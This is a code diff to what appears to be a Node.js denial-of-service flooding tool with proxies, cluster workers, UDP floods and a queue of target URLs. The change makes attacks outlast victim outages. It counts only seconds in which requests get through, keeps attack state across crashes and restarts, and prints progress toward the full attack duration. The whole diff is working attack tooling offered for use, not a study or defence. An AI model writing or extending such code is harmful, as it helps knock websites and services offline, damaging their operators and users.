@@ -272,7 +272,11 @@ function createContext(proxyLine) {
 // Track consecutive failures per host to detect blocking/rate-limiting
 const hostFailureCount = new Map();
 // Track last time any request succeeded (to detect server downtime vs rate-limiting)
+// Reset to Date.now() whenever an attack starts/resumes.
 let lastSuccessTime = Date.now();
+// Wall-clock time when the current attack started — used for robust duration tracking
+// across process crashes + restarts.
+let attackStartTime = 0;
 // Per-thread backoff state: Map<threadId, { consecutiveFailures, backoffMs }>
 const threadBackoff = new Map();
 
@@ -352,20 +356,9 @@ if (USE_CLUSTER && cluster.isWorker) {
     try {
       if (!continueAttack || !target) return;
 
-      const endTime = target.startTime + target.duration;
-      if (Date.now() > endTime) {
-        // If server has been unreachable recently, extend duration instead of stopping
-        const msSinceLastSuccess = Date.now() - lastSuccessTime;
-        if (msSinceLastSuccess > 15000) {
-          const extension = Math.max(60000, msSinceLastSuccess * 2);
-          target.duration += extension;
-          target.startTime += extension;
-          // Continue the attack cycle — don't return
-        } else if (process.connected) {
-          process.send({ type: "targetComplete" });
-          return;
-        }
-      }
+      // Workers do NOT check duration — the master process tracks effective attack time
+      // and broadcasts stop when the target is complete.
+      // This prevents the attack from stopping early due to wall-clock vs effective time mismatch.
 
       // Launch ALL attack types simultaneously
       if (USE_UDP) {
@@ -496,6 +489,37 @@ function stopWatchdog() {
   watchdogStallCount = 0;
 }
 
+// ===================== EFFECTIVE ATTACK TIME TRACKER =====================
+// Counts only seconds where at least 1 request succeeded.
+// Server downtime does NOT count toward the duration.
+// This ensures the attack always runs for the full user-specified duration.
+
+function startProductiveTimer() {
+  // Cluster mode uses startStatusDisplay for effective time tracking;
+  // the productive timer is only needed for single-process mode.
+  if (USE_CLUSTER && cluster.isMaster) return;
+  stopProductiveTimer();
+  lastProductiveCheckCount = totalRequestsSent + totalReqCount;
+  productiveTimer = setInterval(() => {
+    if (!continueAttack) return;
+    const currentCount = totalRequestsSent + totalReqCount;
+    if (currentCount > lastProductiveCheckCount) {
+      totalEffectiveMs += 1000;
+    }
+    lastProductiveCheckCount = currentCount;
+    // Note: completion logic is handled by performAttackSingle for single-process mode
+    // and by startStatusDisplay for cluster mode.
+    // This timer ONLY tracks effective time — no state transitions.
+  }, 1000);
+}
+
+function stopProductiveTimer() {
+  if (productiveTimer) {
+    clearInterval(productiveTimer);
+    productiveTimer = null;
+  }
+}
+
 // ===================== MASTER / SINGLE-PROCESS =====================
 
 // Shared state
@@ -511,6 +535,12 @@ let tunnelActive = false;
 let saveTimer = null;
 let statusInterval = null;
 let totalReqCount = 0;
+// Effective attack time — counts only seconds where at least 1 request succeeded.
+// Server downtime does NOT count toward the duration, so the attack always runs
+// for the full user-specified duration regardless of outages.
+let totalEffectiveMs = 0;
+let productiveTimer = null;
+let lastProductiveCheckCount = 0;
 
 // Cluster master forks workers
 if (USE_CLUSTER && cluster.isMaster) {
@@ -533,7 +563,7 @@ if (USE_CLUSTER && cluster.isMaster) {
 
 function ensureStateFileExists() {
   if (!fs.existsSync(stateFilePath)) {
-    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] }));
+    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 }));
   }
 }
 
@@ -542,7 +572,7 @@ function loadState() {
   try {
     return JSON.parse(fs.readFileSync(stateFilePath, "utf-8"));
   } catch {
-    return { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
+    return { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
   }
 }
 
@@ -550,12 +580,18 @@ let state = loadState();
 continueAttack = state.continueAttack;
 currentTarget = state.currentTarget;
 totalRequestsSent = state.totalRequests || 0;
+totalEffectiveMs = state.totalEffectiveMs || 0;
 targetQueue = state.queue || [];
 
 if (currentTarget) {
-  const endTime = currentTarget.startTime + currentTarget.duration;
-  if (Date.now() > endTime) {
-    console.log(colors.yellow(`Target expired: ${currentTarget.url}`));
+  // On restart, check both wall-clock (hard stop) and effective time
+  // If effective time already met, skip this target
+  if (totalEffectiveMs >= currentTarget.duration) {
+    console.log(colors.yellow(`Target already completed effective time: ${currentTarget.url}`));
+    currentTarget = null;
+  } else if (currentTarget.startTime && Date.now() - currentTarget.startTime > currentTarget.duration * 2) {
+    // Wall-clock exceeded 2x duration — target is stale
+    console.log(colors.yellow(`Target wall-clock expired: ${currentTarget.url}`));
     currentTarget = null;
   }
 }
@@ -563,18 +599,21 @@ if (!currentTarget && targetQueue.length > 0) {
   currentTarget = targetQueue.shift();
   console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
   totalRequestsSent = 0;
+  totalEffectiveMs = 0;
 }
 if (currentTarget === null) {
   continueAttack = false;
   totalRequestsSent = 0;
+  totalEffectiveMs = 0;
 }
-state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
+state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs };
 fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
 function debouncedSave() {
   if (saveTimer) return;
   saveTimer = setTimeout(() => {
     state.totalRequests = totalRequestsSent + totalReqCount;
+    state.totalEffectiveMs = totalEffectiveMs;
     fs.writeFile(stateFilePath, JSON.stringify(state), () => {});
     saveTimer = null;
   }, 500);
@@ -585,12 +624,15 @@ function saveNow() {
   totalRequestsSent += totalReqCount;
   totalReqCount = 0;
   state.totalRequests = totalRequestsSent;
+  state.totalEffectiveMs = totalEffectiveMs;
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 }
 
 function resetTotal() {
   totalRequestsSent = 0;
   totalReqCount = 0;
+  totalEffectiveMs = 0;
+  lastProductiveCheckCount = 0;
   state.totalRequests = 0;
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
   console.log(colors.green("Total reset to 0"));
@@ -604,8 +646,17 @@ function startStatusDisplay() {
     const count = totalReqCount;
     totalRequestsSent += count;
     totalReqCount = 0;
+    // Track effective time: if any requests succeeded this second, count it
+    if (count > 0) totalEffectiveMs += 1000;
+    // In cluster mode, check if effective duration has been met
+    if (count > 0 && currentTarget && totalEffectiveMs >= currentTarget.duration) {
+      console.log(colors.green(`[Effective time] ${Math.round(totalEffectiveMs/60000)}min reached — target complete`));
+      handleTargetComplete();
+      return;
+    }
     if (count > 0 || lastStatusLog > 0) {
-      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(count)} req/s`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.magenta(`Workers: ${Object.keys(cluster.workers || {}).length || 1}`)}`);
+      const effectivePct = currentTarget ? Math.round((totalEffectiveMs / Math.max(1, currentTarget.duration)) * 100) : 0;
+      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(count)} req/s`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.magenta(`Workers: ${Object.keys(cluster.workers || {}).length || 1}`)} | ${colors.green(`${effectivePct}%`)}`);
       debouncedSave();
     }
     lastStatusLog = Date.now();
@@ -617,18 +668,22 @@ function stopStatusDisplay() {
 }
 
 function handleTargetComplete() {
+  stopProductiveTimer();
   if (targetQueue.length > 0) {
     currentTarget = targetQueue.shift();
     console.log(colors.green(`Target completed — starting next: ${currentTarget.url}`));
     resetTotal();
-    state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
+    totalEffectiveMs = 0;
+    state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
     saveNow();
     broadcastToWorkers({ type: "start", target: currentTarget, threadsForMe: Math.ceil(numThreads / (Object.keys(cluster.workers || {}).length || 1)) });
+    startProductiveTimer();
   } else {
     continueAttack = false;
     currentTarget = null;
     resetTotal();
-    state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
+    totalEffectiveMs = 0;
+    state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
     saveNow();
     stopStatusDisplay();
     console.log(colors.yellow("All targets completed. Attack finished."));
@@ -666,6 +721,7 @@ const startAttack = async (url, durationHours) => {
   continueAttack = true;
   state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
   saveNow();
+  lastSuccessTime = Date.now();
 
   const proxies = loadProxies();
   const directCount = proxies.length ? Math.floor(numThreads / 2) : numThreads;
@@ -694,6 +750,7 @@ const startAttack = async (url, durationHours) => {
     }
     startStatusDisplay();
     startWatchdog();
+    startProductiveTimer();
   } else {
     // Single-process mode: launch threads directly
     activeThreads = [];
@@ -717,6 +774,7 @@ const startAttack = async (url, durationHours) => {
       }
     }
     startWatchdog();
+    startProductiveTimer();
   }
   return true;
 };
@@ -728,35 +786,48 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
   try {
     if (!continueAttack || !target) return;
 
-    const endTime = target.startTime + target.duration;
-    if (Date.now() > endTime) {
-      // If server has been unreachable recently, extend duration instead of stopping
-      const msSinceLastSuccess = Date.now() - lastSuccessTime;
-      if (msSinceLastSuccess > 15000) {
-        // Server appears down — extend duration by 2x the downtime to ensure recovery time
-        const extension = Math.max(60000, msSinceLastSuccess * 2);
-        target.duration += extension;
-        target.startTime += extension;
-        console.log(colors.yellow(`[Recovery] Server unreachable for ${Math.round(msSinceLastSuccess/1000)}s — extending duration by ${Math.round(extension/60000)}min`));
-        // Continue the attack cycle — don't return
+    // Check effective attack time first (downtime doesn't count toward duration)
+    if (totalEffectiveMs >= target.duration) {
+      console.log(colors.green(`[Duration] ${Math.round(totalEffectiveMs/60000)}min effective attack time reached — target complete`));
+      if (targetQueue.length > 0) {
+        currentTarget = targetQueue.shift();
+        console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
+        resetTotal();
+        totalEffectiveMs = 0;
+        lastProductiveCheckCount = 0;
+        state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
+        saveNow();
       } else {
-        console.log(colors.yellow(`Target completed: ${target.url}`));
-        if (targetQueue.length > 0) {
-          currentTarget = targetQueue.shift();
-          console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
-          resetTotal();
-          state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
-          saveNow();
-        } else {
-          continueAttack = false;
-          currentTarget = null;
-          resetTotal();
-          state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
-          saveNow();
-          console.log(colors.yellow("All targets completed. Attack finished."));
-        }
-        return;
+        continueAttack = false;
+        currentTarget = null;
+        resetTotal();
+        totalEffectiveMs = 0;
+        state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
+        saveNow();
+        console.log(colors.yellow("All targets completed. Attack finished."));
       }
+      return;
+    }
+
+    // Safety fallback: if wall-clock exceeds 2x duration, force-stop to prevent infinite run
+    if (Date.now() - target.startTime > target.duration * 2) {
+      console.log(colors.yellow(`[Safety] Wall-clock ${Math.round((Date.now()-target.startTime)/60000)}min exceeded 2x target duration — force stopping`));
+      if (targetQueue.length > 0) {
+        currentTarget = targetQueue.shift();
+        resetTotal();
+        totalEffectiveMs = 0;
+        state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
+        saveNow();
+      } else {
+        continueAttack = false;
+        currentTarget = null;
+        resetTotal();
+        totalEffectiveMs = 0;
+        state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
+        saveNow();
+        console.log(colors.yellow("All targets completed. Attack finished."));
+      }
+      return;
     }
 
     // Launch ALL attack types simultaneously
@@ -839,6 +910,7 @@ const stopAttack = async () => {
   if (!continueAttack) { console.log(colors.yellow("No active attack")); return; }
   continueAttack = false;
   stopWatchdog();
+  stopProductiveTimer();
   closeAllUdpSockets();
   stopStatusDisplay();
   broadcastToWorkers({ type: "stop" });
@@ -856,6 +928,7 @@ const resumeAttack = async () => {
   if (!continueAttack || !currentTarget) return;
   console.log(colors.yellow(`Resuming attack on: ${currentTarget.url}`));
   console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
+  lastSuccessTime = Date.now();
 
   if (USE_CLUSTER && cluster.isMaster) {
     const numWorkers = Object.keys(cluster.workers).length;
@@ -864,6 +937,7 @@ const resumeAttack = async () => {
       cluster.workers[id].send({ type: "start", target: currentTarget, threadsForMe: threadsPerWorker });
     }
     startStatusDisplay();
+    startProductiveTimer();
     console.log(colors.green(`Resumed with ${numWorkers} workers (${threadsPerWorker} threads each)`));
     return;
   }
@@ -894,6 +968,7 @@ const resumeAttack = async () => {
     console.log(colors.green(`Resumed with ${activeThreads.length} threads (${halfThreads} direct + ${numThreads - halfThreads} proxy)`));
   }
   startWatchdog();
+  startProductiveTimer();
 };
 
 const autoStartTunnel = async () => {
@@ -912,10 +987,16 @@ const autoStartTunnel = async () => {
 
 const showStatus = () => {
   if (!continueAttack || !currentTarget) { console.log(colors.yellow("No active attack")); return; }
-  const remaining = ((currentTarget.startTime + currentTarget.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
+  const effectivePct = currentTarget.duration > 0 ? Math.min(100, Math.round((totalEffectiveMs / currentTarget.duration) * 100)) : 0;
+  const effectiveMin = Math.round(totalEffectiveMs / 60000);
+  const wallMs = Date.now() - currentTarget.startTime;
+  const wallMin = Math.round(wallMs / 60000);
+  const targetMin = Math.round(currentTarget.duration / 60000);
   console.log(colors.cyan("\n=== ATTACK STATUS ==="));
   console.log(`${colors.yellow("Current Target:")} ${currentTarget.url}`);
-  console.log(`${colors.gray(`Remaining: ${remaining}h`)}`);
+  console.log(`${colors.gray(`Target duration: ${targetMin}min`)}`);
+  console.log(`${colors.cyan(`Effective time: ${effectiveMin}min (${effectivePct}% of target)`)}`);
+  console.log(`${colors.gray(`Wall-clock elapsed: ${wallMin}min`)}`);
   console.log(`${colors.green("Requests Sent:")} ${formatNumber(totalRequestsSent + totalReqCount)}`);
   if (USE_CLUSTER && cluster.isMaster) {
     console.log(`${colors.cyan("Workers:")} ${Object.keys(cluster.workers).length}`);
@@ -926,8 +1007,7 @@ const showStatus = () => {
   if (targetQueue.length > 0) {
     console.log(`${colors.yellow("\nQueued Targets:")}`);
     targetQueue.forEach((t, idx) => {
-      const qr = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
-      console.log(`  ${idx + 1}. ${t.url} (${qr}h)`);
+      console.log(`  ${idx + 1}. ${t.url} (${Math.round(t.duration/60000)}min each)`);
     });
   }
   if (tunnelActive && nportUrl) console.log(`${colors.magenta("\nPublic URL:")} ${nportUrl}`);
